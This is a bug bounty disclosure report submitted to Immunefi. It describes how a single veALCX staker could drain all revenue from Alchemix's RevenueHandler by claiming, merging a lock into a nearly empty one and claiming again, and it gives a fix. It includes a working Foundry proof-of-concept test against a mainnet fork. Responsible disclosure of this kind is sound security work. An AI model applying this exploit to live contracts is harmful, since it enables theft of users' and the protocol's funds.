# 31472 - \[SC - Critical] Stealing all revenue from the Alchemix protocol

Submitted on May 20th 2024 at 03:18:32 UTC by @infosec\_us\_team for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31472

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The `RevenueHandler` receives all revenue from the Alchemix protocol, and allows *veALCX stakers* to claim it.

This report shows how 1 malicious staker can steal all funds in the `RevenueHandler`.

A coded Proof of Concept was added to this report.

## Vulnerability Details

In report **30800** we discover how to steal FLUX by *claiming* rewards, then *merging staked positions* and *re-claiming* with an inflated balance.

For the past 14 days, we wondered how to execute a similar attack vector but to steal all revenue from the Alchemix protocol inside the `RevenueHandler`. Today we found a flag in the code that makes it possible.

### The vulnerable function

The bug is in the internal function `_claimable(..)` of `RevenueHandler`. Here's the relevant part:

```javascript
function _claimable(uint256 tokenId, address token) internal view returns (uint256) {

		// Some code here was removed for simplicity...

		for (
				uint256 epochTimestamp = lastClaimEpochTimestamp + WEEK;
				epochTimestamp <= currentEpoch;
				epochTimestamp += WEEK
		) {
				uint256 epochTotalVeSupply = IVotingEscrow(veALCX).totalSupplyAtT(epochTimestamp);
				if (epochTotalVeSupply == 0) continue;
				uint256 epochRevenue = epochRevenues[epochTimestamp][token];
				uint256 epochUserVeBalance = IVotingEscrow(veALCX).balanceOfTokenAt(tokenId, epochTimestamp);
				totalClaimable += (epochRevenue * epochUserVeBalance) / epochTotalVeSupply;
		}
		return totalClaimable + userCheckpoints[tokenId][token].unclaimed;
}
```

> Github link: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol#L297-L326>

The "`for`" loop distributes rewards until the `epochTimestamp` is less **OR EQUAL** than the timestamp for the current epoch.

Transferring rewards to the owner of a veALCX position based on the current balance of the lock is a mistake because veALCX positions can be merged with almost empty positions, allowing for an infinite claiming-merging-reclaiming cycle until no funds are left in the `RevenueHandler`.

The vulnerability can be fixed by replacing `epochTimestamp <= currentEpoch` with `epochTimestamp < currentEpoch`.

### Attack Vector Explained

**Step 1-** Batman and Superman create two `veALCX` Locks, each with **1e18** BPT tokens.

**Step 2-** Joker creates 2 locks, one of them with **1e18** BPT and the second with **1 WEI** of BPT.

> The current timestamp is `1682553635`. During the next blocks an arbitrary amount of revenue is collected by the RevenueHandler, for this example let's say it is `2000e18`.

**Step 3-** Time moves forward to a new epoch, the current timestamp is `1683763200`, and Joker creates a checkpoint in the RevenueHandler and VotingEscrow by calling:

```
revenueHandler.checkpoint();
veALCX.checkpoint();
```

> Right now, the revenue tokens Joker can claim with his lock of **1e18** BPTs is `668036131103950037396`, and for his second lock with **1 WEI** BPT is `0`.
>
> Therefore, the total reward he can claim for his two locks is `668036131103950037396 + 0 = 668036131103950037396`.

**Step 4-** Joker claims all rewards for his **1e18** lock.

**Step 5-** Joker merges the balance of his **1e18** lock with his **1 WEI** lock.

**Step 6-** Joker claims all rewards for his second lock (with an inflated balance).

> Joker's rewards balance is now `1336073005660618375927` instead of `668036131103950037396`.

This can be repeated with more almost-empty locks to drain the protocol fully.

## Impact Details

Stealing all revenue from the Alchemix protocol

## Proof of Concept

In the `RevenueHandlerTest` paste this test and run it with the same timestamp and block used in the test suite.

Run test with:

```
forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/{YOUR_API_KEY} --match-test "testBugInClaim" --fork-block-number 17133822 -vv
```

PoC:

```
		function testBugInClaim() external {

				console2.log(block.timestamp);

				uint256 _tokenId1 = createVeAlcx(admin, TOKEN_1, MAXTIME, true);
				uint256 _tokenId2 = createVeAlcx(admin, 1, MAXTIME, true);
				uint256 _tokenId3 = createVeAlcx(admin, TOKEN_1, MAXTIME, true);
				uint256 _tokenId4 = createVeAlcx(admin, TOKEN_1, MAXTIME, true);

				hevm.warp(block.timestamp + (ONE_EPOCH_TIME - 35)); // Current timestamp plus (2 weeks minus 35 seconds)
				hevm.roll(block.number + ONE_EPOCH_BLOCKS);

				// We accrue revenue
				uint256 revAmt = 2000e18;
				_accrueRevenue(dai, revAmt);

				// Then we checkpoint
				revenueHandler.checkpoint();
				veALCX.checkpoint();

				console2.log("alUSD balance before:", IERC20(alusd).balanceOf(admin)); // 0

				console2.log("Claimable for _tokenId1:", revenueHandler.claimable(_tokenId1, alusd)); // 668036131103950037396
				console2.log("Claimable for _tokenId2:", revenueHandler.claimable(_tokenId2, alusd)); // 0
				console2.log("Balance after claiming should be _tokenId1 + _tokenId2 = ", revenueHandler.claimable(_tokenId1, alusd) + revenueHandler.claimable(_tokenId2, alusd));

				hevm.startPrank(admin);

				// Claim _tokenId1
				revenueHandler.claim(_tokenId1, alusd, address(0), revenueHandler.claimable(_tokenId1, alusd), admin);

				// Merge _tokenId1 and _tokenId2
				veALCX.merge(_tokenId1, _tokenId2);

				// Claim _tokenId2
				revenueHandler.claim(_tokenId2, alusd, address(0), revenueHandler.claimable(_tokenId2, alusd), admin);

				hevm.stopPrank();

				console2.log("Actual finanl balance:", IERC20(alusd).balanceOf(admin));
    }

```
